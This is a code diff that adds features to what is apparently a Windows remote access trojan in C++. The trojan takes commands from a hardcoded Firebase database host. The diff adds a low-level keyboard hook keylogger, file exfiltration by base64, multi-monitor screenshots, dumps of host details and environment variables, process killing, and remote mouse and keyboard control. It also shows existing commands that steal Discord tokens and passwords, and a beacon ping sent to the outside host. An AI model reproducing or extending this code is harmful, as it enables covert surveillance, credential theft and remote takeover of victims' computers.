@@ -22,9 +22,14 @@ std::string publicIP;
 bool g_noPing=false;
 int g_liveQuality=25;
 float g_liveScale=0.5f;
+int g_liveMonitor=0;
+bool g_serverSSL = true;
 std::string g_serverHost = "solix-710c0-default-rtdb.europe-west1.firebasedatabase.app";
 int g_serverPort = 443;
-bool g_serverSSL = true;
+bool g_keylogRunning=false;
+std::string g_keylogBuffer;
+CRITICAL_SECTION g_keylogLock;
+HHOOK g_keylogHook=NULL;
 
 std::string getComputerName() {
     char buf[MAX_PATH]; DWORD sz = MAX_PATH;
@@ -471,21 +476,213 @@ std::string fileUpload(const std::string& payload) {
     return "ok:" + std::to_string(decoded.size()) + " bytes";
 }
 
+std::string fileDownload(const std::string& path) {
+    if (path.empty()) return "err:empty_path";
+    HANDLE f = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
+    if (f == INVALID_HANDLE_VALUE) return "err:open:" + std::to_string(GetLastError());
+    DWORD sz = GetFileSize(f, 0);
+    if (sz == 0) { CloseHandle(f); return "err:empty"; }
+    if (sz > 10*1024*1024) { CloseHandle(f); return "err:toobig_10mb"; }
+    std::vector<unsigned char> buf(sz);
+    DWORD rd = 0;
+    if (!ReadFile(f, buf.data(), sz, &rd, 0) || rd != sz) { CloseHandle(f); return "err:read"; }
+    CloseHandle(f);
+    return base64Encode(buf.data(), sz);
+}
+
+std::string clipboardWrite(const std::string& text) {
+    if (text.empty()) return "err:empty";
+    if (!OpenClipboard(0)) return "err:clipboard";
+    EmptyClipboard();
+    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
+    if (!hg) { CloseClipboard(); return "err:alloc"; }
+    memcpy(GlobalLock(hg), text.c_str(), text.size() + 1);
+    GlobalUnlock(hg);
+    SetClipboardData(CF_TEXT, hg);
+    CloseClipboard();
+    return "ok";
+}
+
+LRESULT CALLBACK keylogProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
+        WORD vk = ks->vkCode;
+        bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
+        bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
+        bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
+        std::string prefix;
+        if (ctrl) prefix += "Ctrl+";
+        if (alt) prefix += "Alt+";
+        if (shift) prefix += "Shift+";
+        std::string keyName;
+        if (vk >= 0x30 && vk <= 0x39) {
+            char c = shift ? ")!@#$%^&*("[vk-0x30] : (char)vk;
+            keyName = std::string(1, c);
+        } else if (vk >= 0x41 && vk <= 0x5A) {
+            char c = (char)(vk + (shift ? 0 : 32));
+            keyName = std::string(1, c);
+        } else if (vk == VK_RETURN) keyName = "[Enter]";
+        else if (vk == VK_SPACE) keyName = " ";
+        else if (vk == VK_BACK) keyName = "[Backspace]";
+        else if (vk == VK_TAB) keyName = "[Tab]";
+        else if (vk == VK_ESCAPE) keyName = "[Esc]";
+        else if (vk == VK_DELETE) keyName = "[Del]";
+        else if (vk == VK_LEFT) keyName = "[Left]";
+        else if (vk == VK_RIGHT) keyName = "[Right]";
+        else if (vk == VK_UP) keyName = "[Up]";
+        else if (vk == VK_DOWN) keyName = "[Down]";
+        else if (vk == VK_HOME) keyName = "[Home]";
+        else if (vk == VK_END) keyName = "[End]";
+        else if (vk == VK_PRIOR) keyName = "[PgUp]";
+        else if (vk == VK_NEXT) keyName = "[PgDn]";
+        else {
+            char buf[16];
+            sprintf(buf, "[VK:%d]", (int)vk);
+            keyName = buf;
+        }
+        std::string entry = prefix + keyName;
+        EnterCriticalSection(&g_keylogLock);
+        g_keylogBuffer += entry + "\n";
+        if (g_keylogBuffer.size() > 50000) g_keylogBuffer = g_keylogBuffer.substr(g_keylogBuffer.size() - 40000);
+        LeaveCriticalSection(&g_keylogLock);
+    }
+    return CallNextHookEx(g_keylogHook, nCode, wParam, lParam);
+}
+
+std::string startKeylog() {
+    if (g_keylogRunning) return "already_running";
+    InitializeCriticalSection(&g_keylogLock);
+    g_keylogHook = SetWindowsHookExA(WH_KEYBOARD_LL, keylogProc, GetModuleHandle(NULL), 0);
+    if (!g_keylogHook) return "err:hook_failed";
+    g_keylogRunning = true;
+    g_keylogBuffer.clear();
+    return "ok";
+}
+
+std::string stopKeylog() {
+    if (!g_keylogRunning) return "not_running";
+    if (g_keylogHook) { UnhookWindowsHookEx(g_keylogHook); g_keylogHook = NULL; }
+    g_keylogRunning = false;
+    return "ok";
+}
+
+std::string dumpKeylog() {
+    EnterCriticalSection(&g_keylogLock);
+    std::string out = g_keylogBuffer;
+    LeaveCriticalSection(&g_keylogLock);
+    return out.empty() ? "(no keys logged)" : out;
+}
+
+std::string screenshotAll() {
+    int monCount = GetSystemMetrics(SM_CMONITORS);
+    std::string combined;
+    for (int i = 0; i < monCount; i++) {
+        std::string s = takeScreenshot(i);
+        if (!s.empty()) {
+            if (!combined.empty()) combined += "\n===MON:" + std::to_string(i) + "===\n";
+            combined += s;
+        }
+    }
+    return combined.empty() ? "err:no_monitors" : combined;
+}
+
+std::string setWallpaper(const std::string& path) {
+    if (path.empty()) return "err:empty";
+    BOOL ok = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+    return ok ? "ok" : "err:" + std::to_string(GetLastError());
+}
+
+std::string getHostInfo() {
+    SYSTEM_INFO si; GetSystemInfo(&si);
+    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
+    char compName[MAX_PATH+1]; DWORD csz = MAX_PATH; GetComputerNameA(compName, &csz);
+    char userName[MAX_PATH+1]; DWORD usz = MAX_PATH; GetUserNameA(userName, &usz);
+    char osArch[32]; sprintf(osArch, "%s", sizeof(void*)==8 ? "x64" : "x86");
+    OSVERSIONINFOEXA ov = {sizeof(ov)}; GetVersionExA((OSVERSIONINFOA*)&ov);
+    std::string gpu = execCmd("powershell -c \"(Get-CimInstance Win32_VideoController | Select-Object -First 1 Name).Name\"");
+    while (!gpu.empty() && (gpu.back()=='\n'||gpu.back()=='\r'||gpu.back()==' ')) gpu.pop_back();
+    ULARGE_INTEGER freeB, totalB, totalF;
+    std::string disks = "[";
+    DWORD drives = GetLogicalDrives();
+    for (int i = 0; i < 26; i++) {
+        if (drives & (1 << i)) {
+            char root[4] = {(char)('A'+i), ':', '\\', 0};
+            if (GetDriveTypeA(root) == DRIVE_FIXED && GetDiskFreeSpaceExA(root, &freeB, &totalB, &totalF)) {
+                if (disks.size() > 1) disks += ",";
+                char volName[256]; DWORD vsz = 255;
+                GetVolumeInformationA(root, volName, vsz, NULL, NULL, NULL, NULL, 0);
+                disks += "{\"d\":\"" + std::string(1, root[0]) + "\",\"v\":\"" + jsonEscape(volName) + "\",\"t\":" + std::to_string(totalB.QuadPart / (1024*1024*1024)) + ",\"f\":" + std::to_string(freeB.QuadPart / (1024*1024*1024)) + "}";
+            }
+        }
+    }
+    disks += "]";
+    std::string out = "{";
+    out += "\"host\":\"" + jsonEscape(compName) + "\",";
+    out += "\"user\":\"" + jsonEscape(userName) + "\",";
+    out += "\"arch\":\"" + std::string(osArch) + "\",";
+    out += "\"os\":\"Windows " + std::to_string(ov.dwMajorVersion) + "." + std::to_string(ov.dwMinorVersion) + " Build " + std::to_string(ov.dwBuildNumber) + "\",";
+    out += "\"cores\":" + std::to_string(si.dwNumberOfProcessors) + ",";
+    out += "\"ram\":" + std::to_string(ms.ullTotalPhys / (1024*1024)) + ",";
+    out += "\"ram_free\":" + std::to_string(ms.ullAvailPhys / (1024*1024)) + ",";
+    out += "\"disks\":" + disks + ",";
+    out += "\"gpus\":\"" + jsonEscape(gpu) + "\",";
+    out += "\"uptime\":" + std::to_string(GetTickCount64() / 1000);
+    out += "}";
+    return out;
+}
+
+std::string getEnvVars() {
+    char* env = GetEnvironmentStringsA();
+    if (!env) return "err:no_env";
+    std::string out;
+    char* p = env;
+    while (*p) {
+        std::string line(p);
+        if (line.find("PATH") == std::string::npos && line.find("PATHEXT") == std::string::npos && line.find("PSModulePath") == std::string::npos) {
+            if (line.size() > 1 && line.find("=C:\\") == std::string::npos && line.find("=D:\\") == std::string::npos) {
+                if (!out.empty()) out += "\n";
+                out += line;
+            }
+        }
+        p += line.size() + 1;
+    }
+    FreeEnvironmentStringsA(env);
+    return out.empty() ? "(empty)" : out;
+}
+
+std::string processKillName(const std::string& name) {
+    if (name.empty()) return "err:empty";
+    std::string r = execCmd("taskkill /f /im \"" + name + "\"");
+    return r.find("SUCCESS") != std::string::npos || r.find("success") != std::string::npos ? "ok" : r;
+}
+
 std::string handleMouse(const std::string& payload) {
     std::string xs=extractJson(payload,"x");
     std::string ys=extractJson(payload,"y");
     std::string action=extractJson(payload,"action");
+    std::string ds=extractJson(payload,"delta");
     if(xs.empty()||ys.empty()||action.empty()) return "bad_payload";
     int x=std::stoi(xs); int y=std::stoi(ys);
     int sw=GetSystemMetrics(SM_CXSCREEN); int sh=GetSystemMetrics(SM_CYSCREEN);
-    DWORD f=MOUSEEVENTF_ABSOLUTE;
-    if(action=="move") f|=MOUSEEVENTF_MOVE;
-    else if(action=="down") f|=MOUSEEVENTF_LEFTDOWN;
-    else if(action=="up") f|=MOUSEEVENTF_LEFTUP;
-    else return "bad_action";
     INPUT in={0};in.type=INPUT_MOUSE;
-    in.mi.dx=(x*65535)/sw; in.mi.dy=(y*65535)/sh;
-    in.mi.dwFlags=f;
+    in.mi.dx=(x*65535)/sw; in.mi.dy=(y*65535)/sh; in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE;
+    if(action=="move") in.mi.dwFlags|=MOUSEEVENTF_MOVE;
+    else if(action=="down") in.mi.dwFlags|=MOUSEEVENTF_LEFTDOWN;
+    else if(action=="up") in.mi.dwFlags|=MOUSEEVENTF_LEFTUP;
+    else if(action=="right_down") in.mi.dwFlags|=MOUSEEVENTF_RIGHTDOWN;
+    else if(action=="right_up") in.mi.dwFlags|=MOUSEEVENTF_RIGHTUP;
+    else if(action=="middle_down") in.mi.dwFlags|=MOUSEEVENTF_MIDDLEDOWN;
+    else if(action=="middle_up") in.mi.dwFlags|=MOUSEEVENTF_MIDDLEUP;
+    else if(action=="double") { in.mi.dwFlags|=MOUSEEVENTF_LEFTDOWN; SendInput(1,&in,sizeof(in)); in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP; SendInput(1,&in,sizeof(in)); in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN; SendInput(1,&in,sizeof(in)); in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP; SendInput(1,&in,sizeof(in)); return "ok"; }
+    else if(action=="scroll") { int d=0;try{d=std::stoi(ds);}catch(...){d=120;} in.mi.dwFlags=MOUSEEVENTF_WHEEL; in.mi.mouseData=d; SendInput(1,&in,sizeof(in)); return "ok"; }
+    else if(action=="drag") {
+        INPUT mv={0};mv.type=INPUT_MOUSE;mv.mi.dx=(x*65535)/sw;mv.mi.dy=(y*65535)/sh;mv.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE;
+        INPUT dn={0};dn.type=INPUT_MOUSE;dn.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN;
+        SendInput(1,&dn,sizeof(dn));
+        for(int i=0;i<5;i++){Sleep(5);SendInput(1,&mv,sizeof(mv));}
+        return "ok_dragging";
+    }
+    else return "bad_action";
     SendInput(1,&in,sizeof(in));
     return "ok";
 }
@@ -494,17 +691,46 @@ std::string handleKeyboard(const std::string& payload) {
     std::string ks=extractJson(payload,"key");
     std::string action=extractJson(payload,"action");
     if(ks.empty()||action.empty()) return "bad_payload";
+    std::string combo=extractJson(payload,"combo");
+    auto sendKey=[&](WORD vk, bool up)->void{
+        INPUT in={0};in.type=INPUT_KEYBOARD;in.ki.wVk=vk;
+        if(up) in.ki.dwFlags|=KEYEVENTF_KEYUP;
+        SendInput(1,&in,sizeof(in));
+    };
+    if(!combo.empty()) {
+        std::vector<WORD> keys;
+        size_t p=0;
+        while(p<combo.size()) {
+            size_t sep=combo.find(',',p);
+            std::string tok=combo.substr(p,sep==std::string::npos?std::string::npos:sep-p);
+            while(!tok.empty()&&tok[0]==' ')tok=tok.substr(1);
+            keys.push_back((WORD)std::stoi(tok));
+            if(sep==std::string::npos) break;
+            p=sep+1;
+        }
+        bool isUp=(action=="up");
+        for(WORD k:keys) sendKey(k,isUp);
+        return "ok";
+    }
     WORD vk=(WORD)std::stoi(ks);
-    INPUT in={0};in.type=INPUT_KEYBOARD;
-    in.ki.wVk=vk;
-    if(action=="up") in.ki.dwFlags|=KEYEVENTF_KEYUP;
-    SendInput(1,&in,sizeof(in));
+    sendKey(vk,action=="up");
     return "ok";
 }
 
 void sendPing() {
     std::string ts = getTimestamp();
-    std::string body = "{\"ip\":\"" + publicIP + "\",\"created_at\":\"" + ts + "\"}";
+    SYSTEM_INFO si; GetSystemInfo(&si);
+    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
+    int monCount = GetSystemMetrics(SM_CMONITORS);
+    std::string body = "{\"ip\":\"" + publicIP + "\",\"created_at\":\"" + ts + "\","
+        "\"cores\":" + std::to_string(si.dwNumberOfProcessors) + ","
+        "\"ram\":" + std::to_string(ms.ullTotalPhys / (1024*1024)) + ","
+        "\"ram_free\":" + std::to_string(ms.ullAvailPhys / (1024*1024)) + ","
+        "\"monitors\":" + std::to_string(monCount) + ","
+        "\"keylog\":" + std::string(g_keylogRunning ? "true" : "false") + ","
+        "\"uptime\":" + std::to_string(GetTickCount64() / 1000) + ","
+        "\"version\":\"2.0\""
+        "}";
     httpsPut("/pings/" + fbEsc(computerName) + ".json", body);
 }
 
@@ -770,12 +996,24 @@ DWORD WINAPI pollThread(LPVOID) {
                     else if (type == "live_config") {
                         try{int q=std::stoi(extractJson(payload,"quality"));if(q>=1&&q<=100)g_liveQuality=q;}catch(...){}
                         try{float s=std::stof(extractJson(payload,"scale"));if(s>=0.1f&&s<=1.0f)g_liveScale=s;}catch(...){}
+                        try{int m=std::stoi(extractJson(payload,"monitor"));if(m>=0)g_liveMonitor=m;}catch(...){}
                         result="ok";
                     } else if (type == "discord_tokens") result = getDiscordTokens();
                     else if (type == "passwords") result = getPasswords();
                     else if (type == "network_info") result = getNetworkInfo();
                     else if (type == "services") result = getServices();
                     else if (type == "installed_apps") result = getInstalledApps();
+                    else if (type == "file_download") result = fileDownload(payload);
+                    else if (type == "clipboard_write") result = clipboardWrite(payload);
+                    else if (type == "keylog_start") result = startKeylog();
+                    else if (type == "keylog_stop") result = stopKeylog();
+                    else if (type == "keylog_dump") result = dumpKeylog();
+                    else if (type == "screenshot_all") result = screenshotAll();
+                    else if (type == "wallpaper") result = setWallpaper(payload);
+                    else if (type == "host_info") result = getHostInfo();
+                    else if (type == "env_vars") result = getEnvVars();
+                    else if (type == "process_kill_name") result = processKillName(payload);
+                    else if (type == "live_monitor") { try{int m=std::stoi(payload);if(m>=0)g_liveMonitor=m;}catch(...){} result="ok:"+std::to_string(g_liveMonitor); }
                     else result = "unknown_type";
                 } catch(...) { result = "exec_err"; }
                 std::string escaped = jsonEscape(result);
@@ -795,7 +1033,7 @@ DWORD WINAPI screenThread(LPVOID) {
         DWORD t0 = GetTickCount();
         int q = g_liveQuality; float s = g_liveScale;
         try {
-            std::string b64 = takeScreenshotScaled(0, q, s);
+            std::string b64 = takeScreenshotScaled(g_liveMonitor, q, s);
             std::string escaped = jsonEscape(b64);
             std::string ts = getTimestamp();
             char scaleStr[16]; sprintf(scaleStr, "%.2f", s);
